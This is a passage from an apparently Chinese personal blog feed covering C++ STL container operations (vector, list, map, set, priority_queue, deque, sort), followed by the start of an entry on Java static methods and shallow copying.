<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; generate(<span class="type">int</span> numRows) &#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;numRows; ++i) &#123;</span><br><span class="line">      <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">temp</span><span class="params">(i+<span class="number">1</span>,<span class="number">1</span>)</span>;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;&amp;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">      result.push_back(temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;numRows; ++i) &#123;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;&amp;result[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">0x7fff5fbff5f0</span><br><span class="line">0x7fff5fbff5f0</span><br><span class="line">0x7fff5fbff5f0</span><br><span class="line">0x100105540</span><br><span class="line">0x100105558</span><br><span class="line">0x100105570</span><br></pre></td></tr></table></figure>

<p>由此可知，<code>push_back()</code>函数不是借用传入元素的地址，而是将元素所指的内容(堆上的数据)都复制到自己的堆上。</p>
<h3 id="3-3-删"><a href="#3-3-删" class="headerlink" title="3.3. 删"></a>3.3. 删</h3><p><code>pop_back()</code>: 删除容器尾部的元素</p>
<p><code>v.clear()</code>: 清空vector</p>
<ul>
<li>参数：无</li>
<li>返回值：无</li>
</ul>
<h3 id="3-4-改"><a href="#3-4-改" class="headerlink" title="3.4. 改"></a>3.4. 改</h3><p><code>v[n] = 1</code>: 与数组元素赋值方式相同</p>
<p><code>v1 = v2</code>: 将数组v1赋值给数组v2</p>
<h3 id="3-5-比较"><a href="#3-5-比较" class="headerlink" title="3.5. 比较"></a>3.5. 比较</h3><p><code>v1 == v2</code>: 判断两个数组是否相等。此外 <code>!=</code>、<code>&lt;</code>、<code>&lt;=</code>、<code>&gt;</code>、<code>&gt;=</code> 也可以使用</p>
<h3 id="3-5-查"><a href="#3-5-查" class="headerlink" title="3.5. 查"></a>3.5. 查</h3><p><code>v[n]</code>: 获取下标为n的元素</p>
<p><code>v.size()</code></p>
<p><code>v.empty()</code></p>
<h3 id="3-6-遍历"><a href="#3-6-遍历" class="headerlink" title="3.6. 遍历"></a>3.6. 遍历</h3><p><code>v.begin()</code></p>
<ul>
<li>参数：无</li>
<li>返回值：指向vector首地址的指针</li>
</ul>
<p><code>v.end()</code></p>
<ul>
<li>参数：无</li>
<li>返回值：指向vector<strong>最后一个元素的下一个位置</strong>的指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span>(it = v.begin(); it != v.end(); it++)&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-include-lt-list-gt-链表"><a href="#4-include-lt-list-gt-链表" class="headerlink" title="4. #include&lt;list&gt; 链表"></a>4. #include&lt;list&gt; 链表</h2><p>内部实现：双向链表</p>
<p>优点：</p>
<ul>
<li><p>中间插入删除方便</p>
</li>
<li><p>动态数据个数</p>
</li>
</ul>
<p>缺点：</p>
<ul>
<li>访问数据不方便</li>
</ul>
<h3 id="4-1-创建"><a href="#4-1-创建" class="headerlink" title="4.1. 创建"></a>4.1. 创建</h3><p><code>list&lt;int&gt; l</code></p>
<h3 id="4-2-增"><a href="#4-2-增" class="headerlink" title="4.2. 增"></a>4.2. 增</h3><p><code>l.push_back(num)</code>: 在链表尾部增加一个元素</p>
<ul>
<li>参数：与定义时相同的数据类型</li>
<li>返回值：无</li>
</ul>
<p><code>l.push_front(num)</code>: 在开始位置增加一个元素。参数同上</p>
<p><code>l.insert(iter, num)</code>: 在指定位置插入元素</p>
<ul>
<li>参数：<ul>
<li>iter: 迭代器 <code>list&lt;int&gt;::iterator it</code></li>
<li>num: 定义链表时指定的数据类型的变量</li>
</ul>
</li>
<li>返回值：无</li>
</ul>
<h3 id="4-3-删"><a href="#4-3-删" class="headerlink" title="4.3. 删"></a>4.3. 删</h3><p><code>l.pop_back()</code>: 删除末尾的元素</p>
<p><code>l.pop_front()</code>: 删除第一个元素</p>
<p><code>l.erase(iter)</code>: 删除指定位置的元素</p>
<ul>
<li>参数：<ul>
<li>iter: 迭代器，类型为<code>list&lt;int&gt;::iterator it</code></li>
</ul>
</li>
<li>返回值：无</li>
</ul>
<p><code>l.clear()</code>: 清空</p>
<h3 id="4-4-查"><a href="#4-4-查" class="headerlink" title="4.4. 查"></a>4.4. 查</h3><p><code>l.front()</code></p>
<p><code>l.back()</code></p>
<p><code>l.empty()</code></p>
<p><code>l.size()</code></p>
<h3 id="4-5-遍历"><a href="#4-5-遍历" class="headerlink" title="4.5. 遍历"></a>4.5. 遍历</h3><p><code>l.begin()</code></p>
<p><code>l.end()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>&lt;<span class="type">int</span>&gt; l;</span><br><span class="line"><span class="built_in">list</span>&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span>(it = l.begin(); it != l.end(); it++)&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-6-排序"><a href="#4-6-排序" class="headerlink" title="4.6. 排序"></a>4.6. 排序</h3><p><code>l.sort()</code> \ <code>l.sort(cmp)</code>: 排序，cmp是自定义的排序函数。示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;list&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">  public:</span><br><span class="line">  <span class="type">int</span> a,b;</span><br><span class="line">  A(<span class="type">int</span> t1,<span class="type">int</span> t2) &#123;a=t1,b=t2;&#125;</span><br><span class="line">  <span class="type">bool</span> operator &lt; (<span class="type">const</span> A temp) <span class="type">const</span> &#123;<span class="keyword">return</span> a &lt; temp.a;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">list</span>&lt;A&gt; list_a;</span><br><span class="line">  A <span class="title function_">a1</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span>, <span class="title function_">a2</span><span class="params">(<span class="number">4</span>,<span class="number">6</span>)</span>, <span class="title function_">a3</span><span class="params">(<span class="number">2</span>,<span class="number">8</span>)</span>;</span><br><span class="line">  list_a.push_back(a1);</span><br><span class="line">  list_a.push_back(a2);</span><br><span class="line">  list_a.push_back(a3);</span><br><span class="line"></span><br><span class="line">  list_a.sort(); <span class="comment">// 排序操作</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">list</span>&lt;A&gt;::iterator it;</span><br><span class="line">  it = list_a.begin();</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) &#123;<span class="built_in">cout</span>&lt;&lt;it-&gt;a&lt;&lt;<span class="built_in">endl</span>; it++;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-include-lt-map-gt-映射"><a href="#5-include-lt-map-gt-映射" class="headerlink" title="5. #include&lt;map&gt; 映射"></a>5. #include&lt;map&gt; 映射</h2><p>数据间的映射关联，有序键值对。</p>
<p>内部实现：红黑树，插入、删除、查找的时间复杂度都是$O(logn)$。</p>
<h3 id="5-1-创建"><a href="#5-1-创建" class="headerlink" title="5.1. 创建"></a>5.1. 创建</h3><p><code>map&lt;string, int&gt; people</code>: 键值类型都可以是结构体。但是，需要<strong>重载比较运算符</strong>（因为map内部需要排序），如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="type">int</span> y;</span><br><span class="line">  <span class="type">bool</span> operator &lt; (<span class="type">const</span> Node n) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt; n.x || (x == n.x &amp;&amp; y &lt; n.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>&lt;Node, <span class="type">int</span>&gt; nodes;</span><br><span class="line">nodes[Node&#123;<span class="number">1</span>,<span class="number">2</span>&#125;] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><code>map</code>中的元素都是<code>pair&lt;const K, T&gt;</code>类型的，<code>pair</code>类型可以通过<code>first</code>成员访问键、<code>second</code>成员访问值。</p>
<h3 id="5-2-增"><a href="#5-2-增" class="headerlink" title="5.2. 增"></a>5.2. 增</h3><p><code>people[&quot;dou&quot;] = 20</code>: 运算符重载。当使用<code>[&quot;dou&quot;]</code>时，若<code>&quot;dou&quot;</code>不存在，则会创建键值对：<code>&quot;dou&quot;:0</code>。然后，将20设为<code>&quot;dou&quot;</code>的值。</p>
<p><code>people.insert(make_pair(&quot;Bill&quot;, 48))</code>: 插入一个<strong>不存在的</strong>键值对。</p>
<ul>
<li><p>参数：</p>
<ul>
<li><code>pair&lt;K, T&gt;</code>: 一个键值对，K类型为映射定义时的键类型、T类型为映射定义时的值类型。</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>pair&lt;map&lt;string, int&gt;::iterator, bool&gt;</code>: <code>pair</code>对象的<code>first</code>成员是一个迭代器，它要么指向插入元素，要么指向阻止插入的元素（元素已存在）；<code>second</code>成员是布尔值，表示是否成功，即该键是否存在。</li>
</ul>
</li>
</ul>
<p>示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pair</span>&lt;<span class="built_in">string</span>, <span class="type">int</span>&gt; peo = <span class="built_in">make_pair</span>(<span class="string">&quot;Bill&quot;</span>, <span class="number">48</span>); <span class="comment">// c++11: auto peo = make_pair(&quot;Bill&quot;, 48);</span></span><br><span class="line"><span class="built_in">pair</span>&lt;<span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="type">int</span>&gt;::iterator, <span class="type">bool</span>&gt; ret_pr = people.insert(peo); <span class="comment">// c++11: auto ret_pr = people.insert(peo);</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ret_pr.first-&gt;first &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ret_pr.first-&gt;second &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; ret_pr.second &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="5-3-删"><a href="#5-3-删" class="headerlink" title="5.3. 删"></a>5.3. 删</h3><p><code>people.erase(key)</code>: 删除键对应的键值对</p>
<ul>
<li>参数：<ul>
<li>key: 键类型的变量</li>
</ul>
</li>
<li>返回值：所移除元素的个数，map 容器的返回值只可能是 0 或 1。</li>
</ul>
<h3 id="5-4-改"><a href="#5-4-改" class="headerlink" title="5.4. 改"></a>5.4. 改</h3><p><code>people[key] = newValue</code>: 将新值赋给对应的键。<strong>如果键不存在，将创建该键值对</strong>。</p>
<h3 id="5-5-查"><a href="#5-5-查" class="headerlink" title="5.5. 查"></a>5.5. 查</h3><p><code>people[key]</code>: 返回键对应的值</p>
<p><code>people.count(key)</code>: 返回该键对应元素的个数，map 容器的返回值只可能是 0 或 1</p>
<p><code>people.find(key)</code></p>
<ul>
<li>参数：<ul>
<li>key: 键</li>
</ul>
</li>
<li>返回值：<code>map&lt;K, T&gt;::iterator</code>，指向该元素的迭代器，若不存在则指向<code>people.end()</code>。</li>
</ul>
<h3 id="5-6-遍历"><a href="#5-6-遍历" class="headerlink" title="5.6. 遍历"></a>5.6. 遍历</h3><p>两种方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="type">int</span>&gt;::iterator it=people.begin(); it!=people.end(); it++) &#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; it-&gt;second &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// c++11支持</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; p : people) &#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; p.first &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; p.second &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-include-lt-set-gt-集合"><a href="#6-include-lt-set-gt-集合" class="headerlink" title="6. #include&lt;set&gt; 集合"></a>6. #include&lt;set&gt; 集合</h2><p>数据间的关系，有序集合。</p>
<p>内部实现：红黑树。插入删除的时间复杂度为$O(logn)$，查询的时间复杂度为$O(logn)$。</p>
<h3 id="6-1-创建"><a href="#6-1-创建" class="headerlink" title="6.1. 创建"></a>6.1. 创建</h3><p><code>set&lt;int&gt; int_set</code>: 元素类型可以是结构体。但是，需要<strong>重载比较运算符</strong>（因为set内部需要排序），如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> x;</span><br><span class="line">  <span class="type">int</span> y;</span><br><span class="line">  <span class="type">bool</span> operator &lt; (<span class="type">const</span> Node n) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &lt; n.x || (x == n.x &amp;&amp; y &lt; n.y);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&lt;Node&gt; node_set;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：重载比较运算时，要考虑结构体中的每一个元素。</p>
<h3 id="6-2-增"><a href="#6-2-增" class="headerlink" title="6.2. 增"></a>6.2. 增</h3><p><code>node_set.insert(Node&#123;1, 2&#125;)</code>: 增加不存在的元素</p>
<ul>
<li>参数：<ul>
<li><code>Node&#123;1, 2&#125;</code>: 符合定义类型的元素</li>
</ul>
</li>
<li>返回值：<code>pair&lt;set&lt;Node&gt;::iterator, bool&gt;</code></li>
</ul>
<p>示例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pair</span>&lt;<span class="built_in">set</span>&lt;Node&gt;::iterator, <span class="type">bool</span>&gt; pr = node_set.insert(Node&#123;<span class="number">1</span>, <span class="number">2</span>&#125;);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; pr.first-&gt;x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; pr.first-&gt;y &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; pr.second &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>

<h3 id="6-3-删"><a href="#6-3-删" class="headerlink" title="6.3. 删"></a>6.3. 删</h3><p><code>node_set.erase()</code>: 删除迭代器指定位置的元素，或与对象匹配的元素。如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">node_set.erase(Node&#123;<span class="number">1</span>,<span class="number">2</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node_set.count(Node&#123;<span class="number">2</span>,<span class="number">2</span>&#125;)) &#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(2,2) node was found!\n&quot;</span>;</span><br><span class="line">  <span class="built_in">set</span>&lt;Node&gt;::iterator it = node_set.find(Node&#123;<span class="number">2</span>,<span class="number">2</span>&#125;);</span><br><span class="line">  node_set.erase(it);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>node_set.clear()</code>: 清空</p>
<h3 id="6-4-查"><a href="#6-4-查" class="headerlink" title="6.4. 查"></a>6.4. 查</h3><p><code>node_set.find(Node&#123;1,2&#125;)</code>: 若未找到该元素，则返回<code>node_set.end()</code>。</p>
<p><code>node_set.count(Node&#123;2,2&#125;)</code>: 返回匹配的元素个数，0或1。</p>
<h3 id="6-5-遍历"><a href="#6-5-遍历" class="headerlink" title="6.5. 遍历"></a>6.5. 遍历</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">set</span>&lt;Node&gt;::iterator it=node_set.begin(); it!=node_set.end(); it++) &#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; it-&gt;x &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; it-&gt;y &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-include-lt-queue-gt-priority-queue-优先队列"><a href="#7-include-lt-queue-gt-priority-queue-优先队列" class="headerlink" title="7. #include&lt;queue&gt; - priority_queue - 优先队列"></a>7. #include&lt;queue&gt; - priority_queue - 优先队列</h2><p>在优先队列中，元素被赋予优先级。当访问&#x2F;删除元素时，具有最高优先级的元素最先被访问&#x2F;删除。</p>
<p>内部实现：堆。插入的时间复杂度为$O(logN)$，访问头元素的时间复杂度为$O(1)$，删除头元素的时间复杂度为$O(logN)$。</p>
<p>参考：<a href="https://blog.csdn.net/CerberuX/article/details/51762357">https://blog.csdn.net/CerberuX/article/details/51762357</a></p>
<h3 id="7-1-创建"><a href="#7-1-创建" class="headerlink" title="7.1. 创建"></a>7.1. 创建</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> priority;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> Node &amp;a) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> priority &lt; a.priority; <span class="comment">// 大顶堆，反之则是小顶堆</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">priority_queue&lt;Node&gt; q;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-增"><a href="#7-2-增" class="headerlink" title="7.2. 增"></a>7.2. 增</h3><p><code>q.push(node)</code>：在堆的最后加入元素，然后向上筛选</p>
<h3 id="7-3-删"><a href="#7-3-删" class="headerlink" title="7.3. 删"></a>7.3. 删</h3><p><code>q.pop(node)</code>：取出堆的根结点，然后最后一个元素上位，并向下筛选</p>
<h3 id="7-4-查"><a href="#7-4-查" class="headerlink" title="7.4. 查"></a>7.4. 查</h3><p><code>q.top()</code></p>
<p><code>q.size()</code></p>
<p><code>q.empty()</code></p>
<h3 id="7-5-自定义比较"><a href="#7-5-自定义比较" class="headerlink" title="7.5. 自定义比较"></a>7.5. 自定义比较</h3><p>除了定义结构体时重载比较运算符，还可以用如下方式自定义比较：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先队列中元素的自定义比较</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">cmp</span> &#123;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">operator</span> <span class="params">()</span> <span class="params">(ListNode *a, ListNode *b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a-&gt;val &gt; b-&gt;val; <span class="comment">// 小顶堆</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">priority_queue&lt;ListNode*, vector&lt;ListNode*&gt;, cmp&gt; q;</span><br></pre></td></tr></table></figure>

<h2 id="8-include-lt-deque-gt-双向队列"><a href="#8-include-lt-deque-gt-双向队列" class="headerlink" title="8. #include&lt;deque&gt; 双向队列"></a>8. #include&lt;deque&gt; 双向队列</h2><p>头尾都可以进行插入 <code>push</code> 、删除 <code>pop</code> 操作。</p>
<p>内部实现：连续空间，头尾都可以增长。头尾插入删除的时间复杂度为$O(1)$，中间插入删除的时间复杂度为$O(n)$，访问元素的时间复杂度为$O(1)$。</p>
<h3 id="8-1-创建"><a href="#8-1-创建" class="headerlink" title="8.1. 创建"></a>8.1. 创建</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">deque&lt;<span class="type">int</span>&gt; my_dq1;      <span class="comment">// 创建栈上实例</span></span><br><span class="line"><span class="function">deque&lt;<span class="type">int</span>&gt; <span class="title">my_dq2</span><span class="params">(<span class="number">10</span>)</span></span>;  <span class="comment">// 有10个元素的双向队列</span></span><br><span class="line">deque&lt;string&gt; words &#123;<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>, <span class="string">&quot;three&quot;</span>&#125;;              <span class="comment">// 有3个元素，依次为 one two three</span></span><br><span class="line">deque&lt;string&gt; words_part &#123;<span class="built_in">begin</span>(words), <span class="built_in">begin</span>(words)+<span class="number">1</span>&#125;;  <span class="comment">// words的第1个元素，到第2个元素</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-增"><a href="#8-2-增" class="headerlink" title="8.2. 增"></a>8.2. 增</h3><p><code>my_deque.push_back(elem)</code>: 在容器尾部添加一个数据</p>
<p><code>my_deque.push_front(elem)</code>: 在容器头部插入一个数据</p>
<p><code>my_deque.insert(pos, elem)</code>: 在pos位置（迭代器）插入一个elem元素的拷贝，返回新数据的位置</p>
<p><code>my_deque.insert(pos, n, elem)</code>: 在pos位置插入n个elem数据，无返回值</p>
<p><code>my_deque.insert(pos, beg, end)</code>: 在pos位置插入<code>[beg,end)</code>区间（迭代器）的数据，无返回值</p>
<h3 id="8-3-删"><a href="#8-3-删" class="headerlink" title="8.3. 删"></a>8.3. 删</h3><p><code>my_deque.pop_back()</code>: 删除容器最后一个数据</p>
<p><code>my_deque.pop_front()</code>: 删除容器第一个数据</p>
<p><code>my_deque.erase(beg, end)</code>: 删除<code>[beg,end)</code>区间的数据，返回下一个数据的位置</p>
<p><code>my_deque.erase(pos)</code>: 删除pos位置的数据，返回下一个数据的位置</p>
<p><code>my_deque.clear()</code>: 移除容器的所有数据</p>
<h3 id="8-4-改"><a href="#8-4-改" class="headerlink" title="8.4. 改"></a>8.4. 改</h3><p><code>my_deque.at(id) = elem</code>: 修改索引id所指的数据，如果id越界，抛出out_of_range</p>
<p><code>my_deque[id] = elem</code>: 修改索引id所指的数据，如果id越界，不抛出异常，直接出错</p>
<h3 id="8-5-查"><a href="#8-5-查" class="headerlink" title="8.5. 查"></a>8.5. 查</h3><p><code>my_deque.front()</code>: 返回第一个元素</p>
<p><code>my_deque.back()</code>: 返回最后一个元素</p>
<p><code>my_deque.at(id)</code>: 返回索引id所指的数据，如果id越界，抛出out_of_range</p>
<p><code>my_deque[id]</code>: 返回索引id所指的数据，如果id越界，不抛出异常，直接出错</p>
<p><code>my_deque.begin()</code>: 返回容器中第一个元素的迭代器</p>
<p><code>my_deque.end()</code>: 返回容器中最后一个元素之后的迭代器</p>
<p><code>my_deque.size()</code>: 返回容器中元素的个数</p>
<p><code>my_deque.empty()</code>: 判断容器是否为空</p>
<h2 id="9-include-lt-iostream-gt-算法"><a href="#9-include-lt-iostream-gt-算法" class="headerlink" title="9. #include&lt;iostream&gt; 算法"></a>9. #include&lt;iostream&gt; 算法</h2><h3 id="9-1-快速排序函数-sort"><a href="#9-1-快速排序函数-sort" class="headerlink" title="9.1. 快速排序函数 sort()"></a>9.1. 快速排序函数 sort()</h3><p>第一种形式： <code>sort(a, a+n)</code> a是数组的首地址，n是要排序部分的尾地址，默认是从小到大排序</p>
<p>第二种形式： <code>sort(a, a+n, cmp)</code> cmp是一个函数名字，由使用者自己定义排序的依据。例如，你要对结构体数组排序。</p>
<p>结构体排序（适用于C）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> from, to;</span><br><span class="line">  <span class="type">int</span> weight;</span><br><span class="line">&#125;Arc;</span><br></pre></td></tr></table></figure>

<p>cmp函数如下（参数为结构体）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">cmp</span><span class="params">(Arc a, Arc b)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a.weight &lt; b.weight;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用sort函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arc arcs[<span class="number">100005</span>];</span><br><span class="line">sort(arcs, arcs+m, cmp);</span><br></pre></td></tr></table></figure>

<p>即会按照结构体中的weight元素，从小到大排序。</p>
<p>结构体排序还有另一种方式（适用于C++）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C++ 中 struct Arc 就相当于定义了结构体类型 Arc</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Arc</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> from, to;</span><br><span class="line">  <span class="type">int</span> weight;</span><br><span class="line">  <span class="type">bool</span> operator&lt;(<span class="type">const</span> Arc &amp;b) <span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> this-&gt;weight &lt; b.weight;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Arc arcs[<span class="number">100005</span>];</span><br><span class="line">sort(arcs, arcs+m);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>不知道怎么分类的分类</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title>Java重难点</title>
    <url>/Java%E9%87%8D%E9%9A%BE%E7%82%B9.html</url>
    <content><![CDATA[<h2 id="1-静态方法与实例方法的区别"><a href="#1-静态方法与实例方法的区别" class="headerlink" title="1. 静态方法与实例方法的区别"></a>1. 静态方法与实例方法的区别</h2><p>实例方法，对象的成员函数，必须<strong>实例化对象</strong>之后(<code>new Object()</code>)，才能通过<strong>实例对象</strong>调用该对象的实例方法。</p>
<p>静态方法，使用<code>static</code>关键字声明，如<code>main</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br></pre></td></tr></table></figure>

<p>静态方法可以<strong>直接访问</strong>，而<strong>不需要实例化对象</strong>，访问形式为：<code>类名.静态方法名</code>。如：<code>System.out.println()</code>，其调用<code>System</code>包中的<code>out</code>类中的<code>println()</code>静态方法。</p>
<p><strong>注意</strong>：类中的静态方法<strong>只能访问静态成员</strong>（即静态成员变量和静态方法），而不允许访问实例成员变量和实例方法。</p>
<span id="more"></span>

<h2 id="2-浅拷贝与深拷贝"><a href="#2-浅拷贝与深拷贝" class="headerlink" title="2. 浅拷贝与深拷贝"></a>2. 浅拷贝与深拷贝</h2><p>拷贝，指将一个对象的内容复制到另一个对象。常利用<strong>拷贝构造函数</strong>，或<strong>原型模式</strong>完成该操作。</p>
<p>浅拷贝，是指在对象拷贝的过程中，只将对象A的<strong>成员变量的值</strong>复制到对象B的成员变量中。比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    People(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    People(People p) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = p.name;</span><br><span class="line">        <span class="built_in">this</span>.age = p.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

